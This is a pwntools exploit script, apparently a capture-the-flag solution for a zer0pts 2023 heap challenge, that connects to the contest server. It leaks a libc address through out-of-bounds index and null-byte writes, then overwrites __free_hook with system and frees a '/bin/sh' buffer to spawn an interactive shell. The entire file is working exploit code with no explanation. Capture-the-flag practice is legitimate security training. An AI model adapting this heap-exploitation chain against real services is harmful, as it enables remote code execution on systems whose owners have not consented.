from pwn import *
import sys

elf = ELF("chall_patched")
libc = ELF("./libc-2.31.so")

# io = process(elf.path, env = {"LD_PRELOAD":"./libc-2.31.so"})
io = remote("pwn.2023.zer0pts.com", 9003)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

def select(c):
    io.sendlineafter(b"> ", c)


def add(idx):
    select(b"1")
    io.sendlineafter(b"index: ", idx)

def edit(idx, data):
    select(b"2")
    io.sendlineafter("index: ", idx)
    io.sendlineafter(b"data: ", data)

def put_null(idx):
    select(b"1" + b"AAAAAAA" + b"A" * idx)
    io.sendlineafter(b"index: ", b"5")

def bye():
    select(B"3")

def ret2main():
    put_null(0x48)
    bye()

# libc leak
add(b"0") # stored in unsorted bin after ret2main
add(b"6") # privent integration with top chunk and set non-null value to RBP
ret2main()

edit(b"9", p64(0x0))
add(b"37")
ret2main()

io.recvuntil(b"control: ")
r = u64(io.recv(6) + b"\x00\x00")
libc.address = r - 0x1ecbe0
log.info(f'libc addr: {libc.address}')


# overwrite __free_hook
edit(b"9", p64(libc.sym["__free_hook"]))
edit(b"37", p64(libc.sym["system"]))
add(b"0")
edit(b"0", b"/bin/sh")
bye()


io.interactive()
